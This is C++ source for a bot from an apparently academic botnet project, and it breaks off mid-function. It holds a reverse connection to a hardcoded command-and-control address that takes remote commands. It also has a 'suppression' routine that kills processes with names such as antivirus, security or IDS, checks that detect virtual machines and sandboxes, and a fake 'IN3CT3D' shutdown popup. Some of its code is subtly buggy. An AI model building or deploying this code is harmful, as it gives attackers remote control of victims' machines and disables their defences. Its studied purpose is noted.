// Bot code for use in experimental botnet for CMP403 Botnet
// Peter Captain
// 1800326

// Bot does some interesting things, but specialises in detecting hostile programs running,
// as well as searching for evidence of their existence.
// Can interact with the user and annoy them by executing other files

// Disclaimer
    // By proceeding you confirm you have read all of this below->
    //
    // Warning - This program can close your programs as well as access your directory and registry
    // The author takes no responsibilty for what occurs to yours or others machines, should you 
    // experiment with this code. YOU downloaded it.
    // Don't send malware to people.


// Sources
    // Original template can be found by following the guides written by Chetan Nayak:
    // - https://niiconsulting.com/checkmate/2018/02/malware-development-welcome-dark-side-part-1/

    // Counter detection and VM detection adapted from 0xPat's blog on malware development:
    // - https://0xpat.github.io/Malware_development_part_1/

    // Where possible, especially when dealing with the Windows Application Interface (WINAPI)
    // or when dealing with the system processes/ directory / registry, code has been adapted from:
    //  - https://docs.microsoft.com/en-us/windows/win32/api/
    // as well as those libraries listed below

// Info
    // Version 0.41
    // Changes (9/5/22) from 0.36:
    //  -   Removed hscan()
    //  -   Replaced it with all new hunter() code
    //  -   Fixed Suppression function
    //  -   Moved pid details to objects
    //  -   Improved commenting
    //  -   Added Instructions, see below
    //  -   general bug fixing
    
// Instructions
    // Simply run this program - if you are a victim!
    // If not, then replace HOST_ADDR with IP of the c2 machine
    //  - The c2 can be ran from any terminal supporting python3
    // From that machine, run python3 BotServer.py 0.0.0.0 8080
    // Type 'help' or 'h' for further guidance
    // To stop enter 'exit', this will close conenctions as well 
    // as any running programs on infected machines
    // The c2 will will alert the user when connections are 
    // automatically made by the program running on other machines

//
//C++ Headers

#include <winsock2.h>       //Socket Header -	includes scoket functions
#include <windows.h>        //Win API Header -	Windows API functions, use of T/WCHARS
#include <ws2tcpip.h>       //TCP-IP Header -	TCP-IP Defs
#include <tlhelp32.h>       //Toolhelp for windows
#include <vector>
#include <string>

//C Headers
#include <stdio.h>          //Input Output Header    
#include <math.h>           // for mouse capturing
#include <iostream>         //Input Output Debug Header - this cna be commented out for better filesize
//#include <psapi.h>    // For enuamrating procs

// Other classes
#include "Targ.h"
#include "Helper.h"

#pragma comment(lib, "Ws2_32.lib")

#define DEFAULT_BUFLEN 1024
#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 16383

// Host address for the c2 network
#define HOST_ADDR "10.1.2.128"

#define THIS_CODE   "as safe"
#define THAT_AS     "a joke"

class Proc{
    // The Proc (Process) class holds the process details, is inherited by the Targ class
    public:
        std::string name;
        int pid;
        int ppid;

        Proc(){};

        // Overloaded Constructor
        Proc(std::string newname, int newpid){
            name = newname;
            pid = newpid;
        }

        // Very verloaded constructor
        Proc(std::string newname, int newpid, int newppid){
            name = newname;
            pid = newpid;
            ppid = newppid;
        }

        // Getters
        std::string getName(){
            return name;
        }
        int getPid(){
            return pid;
        }
        int getPpid(){
            return pid;
        }

        // Setters
        std::string setName(std::string newname){
            name = newname;
        }
        int setPid(int newpid){
            pid = newpid;
        }
        int setPpid(int newpid){
            
        }
};

class Targ : public Proc {
    // Targ (Target) holds process details for removal and reference
    // This holds target acquisition information for the PID killing process
        // Holds vectors for Suspect Names and Target names
        //  - these can be modified throughout execution
        //  - getters and setters for names and total size
        // Also contains processses (Proc) flagged as a result of scanning
        //  - these also share the same traits as those listed above
        //  - functionailty also exists to handle their PIDS
        // Functionality exists to clear targets and suspects

public:
    // Basic Values for Rollers
        // Adapt as necessary for suspicious phrases
        // Very basic definitions

    std::vector<std::string> terms = {
        "virus",
        "security",
        "malware",
        "protection",
        "crypto",
        "protect"
    };
    std::vector<std::string> knowns = {
        "malware.exe",
        "antivirus.exe",
        "IDS.exe",
        "wannacry.exe"
    };

    // Vectors to hold Target / Suspect processes as they are identified
    std::vector<Proc> Targetprocs;
    Proc targetproc;
    std::vector<Proc> Suspectprocs;
    Proc suspectproc;


    // Local vectors - those not inherited through Proc
    std::vector<std::string> targetnames;
    std::vector<int> targetpids;

    std::vector<std::string> suspectnames;
    std::vector<int> suspectpids;

    //Getters
        //Get Names for the rollers
    std::string getSusName(int x) {
        return terms[x];
    }
    std::string getConName(int y) {
        return knowns[y];
    }

    // Get specific details about a Proc
    std::string getTargetName(int z) {
        //return Targetprocs[z].getName();
        return targetnames[z];
    }
    int getTargetPid(int u) {
        //return Targetprocs[u].getPid();
        return targetpids[u];
    }
    std::string getSuspectName(int v) {
        //return Suspectprocs[v].getName();
        return suspectnames[v];
    }
    int getSuspectPid(int w) {
        //return Suspectprocs[v].getName();
        return suspectpids[w];
    }

    // Get the size of vectors for rollers
    int getNosSus() {
        return terms.size();
    }
    int getNosCon() {
        return knowns.size();
    }

    // Get size of Target and Suspect Vectors
    int getNosTarget() {
        return Targetprocs.size();
        //return targetnames.size();
    }
    int getNosSuspect() {
        return Suspectprocs.size();
        //return suspectnames.size();
    }

    // Get the vectors of Proc objects
    std::vector<Proc> getTargets() {
        return Targetprocs;
    }
    std::vector<Proc> getSuspects() {
        return Suspectprocs;
    }


    //Setters
        // Add a new process to look for
    void addSusName(std::string susName) {
        terms.push_back(susName);
    }
    void addConName(std::string conName) {
        knowns.push_back(conName);
    }

    // Add new details to the vectors, and not those inherited through Proc
    void addTargetName(std::string targetName) {
        targetnames.push_back(targetName);
    }
    void addTargetPid(int targetPid) {
        targetpids.push_back(targetPid);
    }
    void addSuspectName(std::string suspectName) {
        suspectnames.push_back(suspectName);
    }
    void addSuspectPid(int suspectPid) {
        suspectpids.push_back(suspectPid);
    }

    // Add new Procs to the Vectors of Procs
    void addTarget(Proc Tproc) {
        Targetprocs.push_back(Tproc);
    }
    void addSuspect(Proc Sproc) {
        Suspectprocs.push_back(Sproc);
    }

    //Resetters
    void resetTargets() {
        targetnames.clear();
        targetpids.clear();
    }

    void resetSuspects() {
        suspectnames.clear();
        suspectpids.clear();
    }

};

class Reg{
    // Similar to procs, holds the process details
    public:
        std::string name = "";


        std::string getName(){
            return name;
        }
};

Targ targets;
Helper myhelper;

const char* chardword(DWORD longint){
    //Helper function to convert a long integer, such as dword, into a char array
	int number= (int)longint;
    std::string snumb = std::to_string(number);
    char const *pchar = snumb.c_str();

    return pchar;
}

const char* charint(int number){
    // Helper function to take an integer and conver to string, then integer
    std::string snumb = std::to_string(number);
    char const *pchar = snumb.c_str();

    return pchar;
}

const char* charst(std:: string input){
    //Takes a string and returns a char array
    char word[512];
    strncpy(word, input.c_str(), sizeof(word));
    word[sizeof(word) - 1] = 0;

    return word;
}

bool pidcheck(const char* string) {
    // used by the process killer to detect if a supplied value is a number
    const int string_len = strlen(string);
    for(int i = 0; i < string_len; ++i) {
        if(!isdigit(string[i])) 
        return false;
    }
    return true;
}

int strcheck(std::string s1, std::string s2){
    // Used to detect if a string is inside another string
    int i, j;
    int l1 = s1.length();
    int l2 = s2.length();

    // Is this string (s1) in (s2))

    for(i = 0; i <= l1 - l1; i++){
        for(j = 0; j < l1; j++){
            if (s2[i+j] != s1[j])
                break;
        }
        if (j == l1){
            // If it is, return
            return i;
        }
    }
    return -1;

}

void exec(char* returnval, int returnsize, char *fileexec){
    // This function executes a file
    int foo = (int)(ShellExecute(0,0, fileexec, 0, 0, SW_SHOW));

    if (32 >= (int)(ShellExecute(NULL, NULL, fileexec, NULL, NULL, SW_SHOW))) //Get return value in int
    {
        strcat(returnval, "[x] Error executing command..\n");
    }
    else
    {
        strcat(returnval, "\n");
    }
}

void find(char* returnval, int returnsize, char *file){
    // This function finds a file and returns a directory listing of all files as well
    WIN32_FIND_DATA FindFileData;
    HANDLE hFind;
    LARGE_INTEGER filesize;

    DWORD       retval=0;
    TCHAR       buffer[DEFAULT_BUFLEN]=TEXT(""); 
    TCHAR**     lppPart={NULL};

    hFind = FindFirstFile(file, &FindFileData);

    // Finder
        if (hFind == INVALID_HANDLE_VALUE) 
        {
            strcat(returnval,"\nFindFirstFile failed, invalid handle: ");
            strcat(returnval,file);
            strcat(returnval,"\nTry 'c:' or adding '\' \n");
            return;
        } 
        else 
        {
            strcat(returnval,"\nFile found: \t'"); 
            strcat(returnval, FindFileData.cFileName);
            strcat(returnval,"'\n"); 
        }
    
        // Attempt to get path
        retval = GetFullPathName(file,
            DEFAULT_BUFLEN,
            buffer,
            lppPart);


        if (retval == 0) 
        {
            strcat(returnval,"\n GetFullPathName for the target failed \n");
            return;
        }
        else 
        {
            strcat(returnval,"\n Current PATH of target:\n\t");
            strcat(returnval, buffer);
            strcat(returnval,"\n");
            if (lppPart != NULL && *lppPart != 0)
            {
                strcat(returnval,"The final component in the path name is:  \n");
                strcat(returnval, *lppPart);
            }
        }


        // Get DIR listings
        char *filefind = FindFileData.cFileName;
        std::string pattern = file;
        pattern.append("\\*");

        if ((hFind = FindFirstFile(pattern.c_str(), &FindFileData)) != INVALID_HANDLE_VALUE) {
            do {
                strcat(returnval, "\t - ");
                strcat(returnval, FindFileData.cFileName);
                strcat(returnval, "\n");
            } while (FindNextFile(hFind, &FindFileData) != 0);
            FindClose(hFind);
        }
}

std::vector<Reg> regsearch(char* returnval, int returnsize, HKEY hKey){

    // Regsearch deaches the registry for keys, based off:
    // https://docs.microsoft.com/en-us/archive/msdn-magazine/2017/may/c-use-modern-c-to-access-the-windows-registry

    std::vector<Reg> Regs;
    Reg reg;

    TCHAR    achKey[MAX_KEY_LENGTH];            // buffer for subkey name
    DWORD    cbName;                            // size of name string 
    TCHAR    achClass[MAX_PATH] = TEXT("");     // buffer for class name 
    DWORD    cchClassName = MAX_PATH;           // size of class string 
    DWORD    cSubKeys=0;                        // number of subkeys 
    DWORD    cbMaxSubKey;                       // longest subkey size 
    DWORD    cchMaxClass;                       // longest class string 
    DWORD    cValues;                           // number of values for key 
    DWORD    cchMaxValue;                       // longest value name 
    DWORD    cbMaxValueData;                    // longest value data 
    DWORD    cbSecurityDescriptor;              // size of security descriptor 
    FILETIME ftLastWriteTime;                   // last write time 
 
    DWORD i, retCode; 
 
    TCHAR  achValue[MAX_VALUE_NAME]; 
    DWORD cchValue = MAX_VALUE_NAME; 
 
    // Get the class name and the value count. 
    retCode = RegQueryInfoKey(
        hKey,                    // key handle 
        achClass,                // buffer for class name 
        &cchClassName,           // size of class string 
        NULL,                    // reserved 
        &cSubKeys,               // number of subkeys 
        &cbMaxSubKey,            // longest subkey size 
        &cchMaxClass,            // longest class string 
        &cValues,                // number of values for this key 
        &cchMaxValue,            // longest value name 
        &cbMaxValueData,         // longest value data 
        &cbSecurityDescriptor,   // security descriptor 
        &ftLastWriteTime);       // last write time 
 
    // Enumerate the subkeys, until RegEnumKeyEx fails.
    
    if (cSubKeys)
    {
        for (i=0; i<cSubKeys; i++) 
        { 
            cbName = MAX_KEY_LENGTH;
            retCode = RegEnumKeyEx(hKey, 
                     i,
                     achKey, 
                     &cbName, 
                     NULL, 
                     NULL, 
                     NULL, 
                     &ftLastWriteTime); 
            if (retCode == ERROR_SUCCESS) 
            {
                reg.name = achKey;
                Regs.push_back(reg);
            }
            else
            {
                Regs.push_back(reg);
                return Regs;
            }
        } 
    } 
 
    // Enumerate the key values. 
    if (cValues) 
    {
        for (i=0, retCode=ERROR_SUCCESS; i<cValues; i++) 
        { 
            cchValue = MAX_VALUE_NAME; 
            achValue[0] = '\0'; 
            retCode = RegEnumValue(hKey, i, 
                achValue, 
                &cchValue, 
                NULL, 
                NULL,
                NULL,
                NULL);
 
            if (retCode == ERROR_SUCCESS ) 
            { 
                strcat(returnval,"\nError enumerating reg key values ");
            } 
        }
    }
    else{
        Regs.push_back(reg);
        return Regs;
    }

    Regs.push_back(reg);
    return Regs;
}

std::vector<Proc> procs(){

    // This returns a Proc object containing all the current procs on the system

    HANDLE hSnapShot=CreateToolhelp32Snapshot(
        TH32CS_SNAPPROCESS,
        0
    );

    BOOL WINAPI Process32Next(
        HANDLE hSnapshot,
        LPPROCESSENTRY32 lppe
    );

    PROCESSENTRY32* processInfo=new PROCESSENTRY32;

    processInfo->dwSize=sizeof(PROCESSENTRY32);
    int index=0;

    std::vector<Proc> Processes;
    Proc Process;

    while(Process32Next(hSnapShot,processInfo)!=FALSE)
    {
        Process.name = processInfo->szExeFile;
        Process.pid = processInfo->th32ProcessID;
        Process.ppid = processInfo->th32ParentProcessID;
        Processes.push_back(Process);
        index++;
    }

    CloseHandle(hSnapShot);
    delete processInfo;
    return Processes;
}

void kill(char* returnval, int returnsize, char *filekill){   

    // KIlls the specified process - ambigous argument, filekill can be converted to int if detected

    int pid = atoi(filekill);

    HANDLE hSnapShot=CreateToolhelp32Snapshot(
        TH32CS_SNAPPROCESS,
        0
    );

    BOOL WINAPI Process32Next(
        HANDLE hSnapshot,
        LPPROCESSENTRY32 lppe
    );

    PROCESSENTRY32* processInfo=new PROCESSENTRY32;
    processInfo->dwSize=sizeof(PROCESSENTRY32);

    PROCESSENTRY32 pEntry;
    pEntry.dwSize = sizeof (pEntry);

    BOOL hRes = Process32First(hSnapShot, &pEntry);

    if (pidcheck(filekill) == true) // is it a number? If so, target that particular PID
    {
        HANDLE hProcess=OpenProcess(
            PROCESS_TERMINATE,
            0,
            pid
        );

        if(hProcess!=NULL)
        {
            strcat(returnval, "\nPriority Class: ");
            strcat(returnval, chardword(GetPriorityClass(hProcess)));
            SetPriorityClass(hProcess,HIGH_PRIORITY_CLASS);
            TerminateProcess(hProcess,0);
            strcat(returnval, "\nKilled the process: ");
            strcat(returnval, charint(pid));
        }
        else{
            strcat(returnval, "\nUnable to get handle of process: ");
            strcat(returnval, charint(pid));
            strcat(returnval, "\nFailed to kill process for:  ");
            strcat(returnval, charint(pid));
        }
        strcat(returnval, "\n");
        CloseHandle(hProcess);
    }
    else
    {
        while (hRes)
        {
            if (strcmp(pEntry.szExeFile, filekill) == 0)
            {
             HANDLE hProcess = OpenProcess(
                                            PROCESS_TERMINATE, 
                                            0,
                                            (DWORD) pEntry.th32ProcessID);
                if (hProcess != NULL)
                {
                    TerminateProcess(hProcess, 9);
                    CloseHandle(hProcess);
                    strcat(returnval, "\nKilled the process:  ");
                    strcat(returnval, filekill);
                    strcat(returnval, "\tPid: ");
                    strcat(returnval, charint(pEntry.th32ProcessID));
                }
                else{
                    strcat(returnval, "\nUnable to get handle of process: ");
                    strcat(returnval, charint(pEntry.th32ProcessID));
                    strcat(returnval, "\nFailed to kill process for:  ");
                    strcat(returnval, filekill);
                }
            }
            hRes = Process32Next(hSnapShot, &pEntry);
        }
        CloseHandle(hSnapShot);
    }

}

Targ hunter(char* returnval, int returnsize, Targ Target){

    // This function receives the current object holding suspicious 
    //program identities and stops them from running

    char buffer[257] = "";

    std::vector<Proc> Processes = procs();

    // Rollers, uninitialised
    std::vector<std::string> knowns;
    std::vector<std::string> terms;

    // Initialise the rollers 
    for (int a = 0; a < Target.getNosCon(); a++){
        knowns.push_back(Target.getConName(a));
    }

    for (int b = 0; b < Target.getNosSus(); b++){
        terms.push_back(Target.getSusName(b));
    }

    strcat(buffer,  "Beginning Memory Scan for Suspicous Applications");

    // Enumerate all processes
    for (int i = 0; i < Processes.size(); i++){

        // Convert process name to char array
        char procname[32]; 
        strcpy(procname, Processes[i].name.c_str()); 
        procname[sizeof(procname) - 1];

        // Used for string search
        std::string supplied = Processes[i].name;

        // Roll through known terms, add to vector if found
        for (int j = 0; j < knowns.size(); j++) {

            // Convert string to char array
            char known[32];
            strcpy(known, knowns[j].c_str()); 
            known[sizeof(known) - 1];

            // Does the current process match a known process?
            if(strcmp(procname, known) == 0){
                Target.addTarget(Processes[i]);
            }
        }

        // Roll through suspect terms, add to vector if found
        for (int k = 0; k < terms.size(); k++) {

            // Convert string to char array
            char term[32];
            strcpy(term, terms[k].c_str()); 
            term[sizeof(term) - 1];

            std::string target = terms[k];

            // Does the current process contain a known substring?
            if(supplied.find(terms[k]) != std::string::npos){
                Target.addSuspect(Processes[i]);
            }                    
        }
    }
    return Target;
}

void scanreadout(char* returnval, int returnsize, Targ currenttargs){
    //Report function, takes the output of hunter and returns what was found

        //std::cout <<" Detected: "<< currenttargs.getNosTarget() << " Target programs" << std::endl;
        //std::cout <<" Detected: "<< currenttargs.getNosSuspect() << " Suspect programs" << std::endl;

        // Do we have confirmed Targets?
        if (currenttargs.getNosTarget() > 0){
    
            strcat(returnval, "Confirmed Hostiles: \n");
            std::vector<Proc> targets = currenttargs.getTargets();

            for (int x = 0; x < targets.size(); x++){
                const char * pname = targets[x].getName().c_str();
                strcat(returnval, "\tPid : \t");
                strcat(returnval, charint(targets[x].getPid()));
                strcat(returnval, " - Name -  \t");
                strcat(returnval, pname);
                strcat(returnval, "\n\t");
            }
        }else{
            strcat(returnval, "No threats detected \n");
        }

        // What about suspected targets               
        if (currenttargs.getNosSuspect() > 0){

            strcat(returnval, "Suspected Hostiles: \n");
            std::vector<Proc> suspects = currenttargs.getSuspects();

            for (int x = 0; x < suspects.size(); x++){
                const char * pname = suspects[x].getName().c_str();
                strcat(returnval, "\tPid : \t");
                strcat(returnval, charint(suspects[x].getPid()));
                strcat(returnval, " - Name -  \t");
                strcat(returnval, pname);
                strcat(returnval, "\n\t");
            }
        }else{
            strcat(returnval, "No suspect threats detected \n\n");
        }
}

void hardware(char* returnval, int returnsize){
    // Checks system hardware, and compares against norms

    // Check CPU
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
    strcat(returnval, "CPU count: ");
    strcat(returnval, chardword(numberOfProcessors));
    strcat(returnval, "\n");

    // check RAM
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
    strcat(returnval, "RAM: ");
    strcat(returnval, chardword(RAMMB));
    strcat(returnval, " MB \n");

    // check HDD
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    DISK_GEOMETRY pDiskGeometry;
    DWORD bytesReturned;
    DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
    DWORD diskSizeGB;
    diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
    strcat(returnval, "Drive Capacity: ");
    strcat(returnval, chardword(diskSizeGB));
    strcat(returnval, " GB\n");
    strcat(returnval, "=-=-=-=-=-=-=-=-=\n");

    // Warning Readouts
    if (numberOfProcessors < 2)
    {
        strcat(returnval, "System has less than 2 Processors!\n");
    }
        if (RAMMB < 2048)
    {
        strcat(returnval, "System has low amount of RAM!\n");
    }
        if (diskSizeGB < 100) 
    {
        strcat(returnval, "System has unrealistic HDD capacity!\n");
    }
}

void vm(char* returnval, int returnsize){
    // Check for virtualisation artefacts

    DWORD computerNameLength = MAX_COMPUTERNAME_LENGTH + 1;
    wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
    GetComputerNameW(computerName, &computerNameLength);
    CharUpperW(computerName);
    if (wcsstr(computerName, L"DESKTOP-")) {
        strcat(returnval, "System has default name!\n");
    }
    else{
        strcat(returnval, "System is using a unique name\n");
    };

    //check user name
    DWORD UNLEN = 257;
    DWORD userNameLength = UNLEN;
    wchar_t userName[UNLEN + 1];
    GetUserNameW(userName, &userNameLength);
    CharUpperW(userName);
    if (wcsstr(userName, L"ADMIN")) {
        strcat(returnval, "User account is ADMIN!\n");
    }
    else{
        strcat(returnval, "User account in use differs from defaults\n");
    };

    HKEY hKey;
    DWORD mountedUSBDevicesCount;
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Enum\\USBSTOR", 0, KEY_READ, &hKey);
    RegQueryInfoKey(hKey, NULL, NULL, NULL, &mountedUSBDevicesCount, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    int mountcount = (int)mountedUSBDevicesCount;
    char moncon = mountcount +'0';
    strcat(returnval, "System has had :");
    strcat(returnval, &moncon);
    strcat(returnval, " USB storage devices attached\n");

    HMONITOR hMonitor;
    MONITORINFO monitorInfo;
	monitorInfo.cbSize = sizeof(MONITORINFO);
	GetMonitorInfoW(hMonitor, &monitorInfo);
	int xResolution = monitorInfo.rcMonitor.right - monitorInfo.rcMonitor.left;
	int yResolution = monitorInfo.rcMonitor.top - monitorInfo.rcMonitor.bottom;
	if (xResolution < 0) xResolution = -xResolution;
	if (yResolution < 0) yResolution = -yResolution;
	if ((xResolution != 1920 && xResolution != 2560 && xResolution != 1440)
		|| (yResolution != 1080 && yResolution != 1200 && yResolution != 1600 && yResolution != 900))
	{
        strcat(returnval, "Screen resolution is non standard\n");
    } 
    else{
        strcat(returnval, "Screen resolution is standard\n");
    }
}

void msg(char* returnval, int returnsize){
    // Asks the user to click on the message box, to confirm a real person is using the machine
    int response = MessageBoxW(NULL, L"Please hit OK to prevent Shutdown...", L"IN3CT3D", 0);
    if (response == IDOK){
        strcat(returnval, "Human user!\n");
    };
}

void pasiv(char* returnval, int returnsize){
    // Monitors an amount of mouse movements to determine if a human being is using the machine
    POINT currentMousePosition;
    POINT previousMousePosition;
    GetCursorPos(&previousMousePosition);
    double mouseDistance = 0;
    while (true)
    {
	    GetCursorPos(&currentMousePosition);
	    mouseDistance += sqrt(
		    pow(currentMousePosition.x - previousMousePosition.x, 2) +
		    pow(currentMousePosition.y - previousMousePosition.y, 2)
	    );
	    Sleep(100);
	    previousMousePosition = currentMousePosition;
	    if (mouseDistance > 2000) {
            strcat(returnval, "Passive scan has recorded movement\n");
        }
        if (mouseDistance > 6000) {
            strcat(returnval, "Passive scan has recorded continued movement, user is using the machine\n");
            break;
        }
    }
}

void whoami(char* returnval, int returnsize){
    // basic whoami returns username
    DWORD bufferlen = 257;
    GetUserName(returnval, &bufferlen);
}

void hostname(char* returnval, int returnsize){
    // returns the hostname
    DWORD bufferlen = 257;
    GetComputerName(returnval, &bufferlen);
}

void pwd(char* returnval, int returnsize){
    // returns the current working directory
    TCHAR tempvar[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, tempvar);
    strcat(returnval, tempvar);
}

void RevShell()
{
    // Connection details
    WSADATA wsaver;
    WSAStartup(MAKEWORD(2, 2), &wsaver);
    SOCKET tcpsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(HOST_ADDR);
    addr.sin_port = htons(8080);

    // Local / runtime variables
    Targ targets;
    std::string supname = "";
    int suppressflag = 0;

    if (connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(tcpsock);
        WSACleanup();
        exit(0);
    }
    else {
        char CommandReceived[DEFAULT_BUFLEN] = "";
        while (true)
        {
            // command received
            int Result = recv(tcpsock, CommandReceived, DEFAULT_BUFLEN, 0);

            if (suppressflag == true){
                char buffer[257] = "";

                std::cout << "SUPPRESSING" << std::endl;

                Targ currenttargs = hunter(buffer, 257, targets);

                strcat(buffer, "\n Suppressing known targets... \n");
                if (currenttargs.getNosTarget() > 0){
                    std::vector<Proc> targets = currenttargs.getTargets();
                    for (int x = 0; x < targets.size(); x++){                
                        char procname[32]; 
                        strcpy(procname, targets[x].name.c_str()); 
                        procname[sizeof(procname) - 1];
                        kill(buffer, 257, procname);
                    }
                }else{
                    strcat(buffer, " Alert - No threats were detected during suppresion \n");
                }
                send(tcpsock, buffer, strlen(buffer)+1, 0);
                memset(buffer, 0, sizeof(buffer));
                memset(CommandReceived, 0, sizeof(CommandReceived));

                std::cout << "LOOPING" << std::endl;
            }
            if ((strcmp(CommandReceived, "whoami\n") == 0)) {
                //Execute a whoami function
                    char buffer[257] = "";
                    whoami(buffer,257);
                    strcat(buffer, "\n");
                    send(tcpsock, buffer, strlen(buffer)+1, 0);
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
            }
            else if ((strcmp(CommandReceived, "hostname\n") == 0)) {
                //Execute a hostname function
                    char buffer[257] = "";
                    hostname(buffer,257);
                    strcat(buffer, "\n");
                    send(tcpsock, buffer, strlen(buffer)+1, 0);
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
            }
            else if ((strcmp(CommandReceived, "pwd\n") == 0)) {
                //Execute a pwd function
                    char buffer[257] = "";
                    pwd(buffer,257);
                    strcat(buffer, "\n");
                    send(tcpsock, buffer, strlen(buffer)+1, 0);
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
            }
            else if ((strcmp(CommandReceived, "hardware\n") == 0)) {
                //This function enumerates hardware
                    char buffer[257] = "";
                    hardware(buffer,257);
                    strcat(buffer, "\n");
                    send(tcpsock, buffer, strlen(buffer)+1, 0);
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
            }
            else if ((strcmp(CommandReceived, "virmac\n") == 0)) {
                //This function enumerates vm
                    char buffer[257] = "";
                    vm(buffer,257);
                    strcat(buffer, "\n");
                    send(tcpsock, buffer, strlen(buffer)+1, 0);
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
            }
            else if ((strcmp(CommandReceived, "msg\n") == 0)) {
                //This function creates a popup on the users pc
                    char buffer[257] = "";
                    msg(buffer,257);
                    strcat(buffer, "\n");
                    send(tcpsock, buffer, strlen(buffer)+1, 0);
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
            }
            else if ((strcmp(CommandReceived, "pasiv\n") == 0)) {
                //This function enumerates passively monitors the host pc for avtivity
                    char buffer[257] = "";
                    pasiv(buffer,257);
                    strcat(buffer, "\n");
                    send(tcpsock, buffer, strlen(buffer)+1, 0);
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
            }
            else if ((strcmp(CommandReceived, "procs\n") == 0)) {
                //This function enumerates current processes
                    // Calls the procs function, returns the Proc object, reports contents
                    char buffer[257] = "";
                    std::vector<Proc> Processes = procs();

                    for (int i = 0; i < Processes.size(); i++){
                        strcat(buffer,  "\n\t");
                        strcat(buffer,  charint(i));
                        strcat(buffer,  "\t PID: ");
                        strcat(buffer,  charint(Processes[i].getPid()));
                        strcat(buffer,  "\t\t Name: ");
                        strcat(buffer,  Processes[i].name.c_str());
                        send(tcpsock, buffer, strlen(buffer)+1, 0);
                        memset(buffer, 0, sizeof(buffer));
                    }
                    memset(CommandReceived, 0, sizeof(CommandReceived));
            }
            else if ((strcmp(CommandReceived, "hunter\n") == 0)) {
                // Hunter command, but without switch, therefore reveals help dialougue
                    char buffer[257] = "";
                    strcat(buffer, "\n hunter usage: \n 0 - Scan \n 1 - Kill confirmed PIDs \n 2 -  Kill suspected PIDs \n");
                    strcat(buffer, "\n");
                    send(tcpsock, buffer, strlen(buffer)+1, 0);
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
            }
            else if ((strcmp(CommandReceived, "klist\n") == 0)) {
                //This function creates a popup on the users pc
                    char buffer[257] = "";

                    strcat(buffer, "\n Current known threats: \n");
                    for (int a = 0; a < targets.getNosCon(); a++){
                        const char * pname = targets.getConName(a).c_str();
                        strcat(buffer, "\n\t");
                        strcat(buffer, pname);
                    }

                    strcat(buffer, "\n\n Current suspected terms: \n");
                    for (int b = 0; b < targets.getNosSus(); b++){
                        const char * pname = targets.getSusName(b).c_str();
                        strcat(buffer, "\n\t");
                        strcat(buffer, pname);
                    }

                    strcat(buffer, "\n\n You can add to these lists by using: \n addknown _entry_ / addsuspect _entry_ \n");
                    strcat(buffer, " E.g: addknown nastymalware.exe \n");
                    send(tcpsock, buffer, strlen(buffer)+1, 0);
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
            }
            else if ((strcmp(CommandReceived, "regscan\n") == 0)) {
                //This function enumerates the registry, and reprots back if suspicious entrys were found
                    char buffer[257] = "";
                    std::vector<Reg> Conregs;
                        Reg conreg;
                    std::vector<Reg> Regs;
                        Reg reg;

                    // Adapt as necessary for KNOWN executables
                    std::vector<std::string> knownregs = {
                        "malware.exe",
                        "antivirus.exe",
                        "IDS.exe",
                        "wannacry.exe",
                        "dodgy.exe"
                    };

                    HKEY hTestKey;   

                    if( RegOpenKeyEx( 
                        HKEY_CURRENT_USER,
                        TEXT("SOFTWARE\\"),
                        0,
                        KEY_READ,
                        &hTestKey) == ERROR_SUCCESS
                    )
                    {
                        Regs = regsearch(buffer,257,hTestKey);
                    }
                    else{
                        strcat(buffer,"Error");
                    }

                    RegCloseKey(hTestKey);

                    strcat(buffer, "Beginning Registry Scan for Suspicous Applications");

                    for (int i = 0; i < Regs.size(); i++){
                        char regname[32]; 
                        strcpy(regname, Regs[i].name.c_str()); 
                        regname[sizeof(regname) - 1];

                        // Roll through known terms, add to vector if found
                        for (int j = 0; j < knownregs.size(); j++) {

                            char knownreg[32];
                            strcpy(knownreg, knownregs[j].c_str()); 
                            knownreg[sizeof(knownreg) - 1];

                            if(strcmp(regname, knownreg) == 0){
                                conreg.name    = Regs[i].name;
                                Conregs.push_back(conreg);  
                            }
                        }
                    }
            
                    if(Conregs.size() > 0){

                        strcat(buffer,  "\n\tConfirmed Hostile programs on host PC...");
                        strcat(buffer,  "(");
                        strcat(buffer,  charint(Conregs.size()));
                        strcat(buffer,  ")");

                        int limit = Conregs.size();

                        for(int l = 0; l < limit; l++)
                        {
                            const char * conname = Conregs[l].getName().c_str();
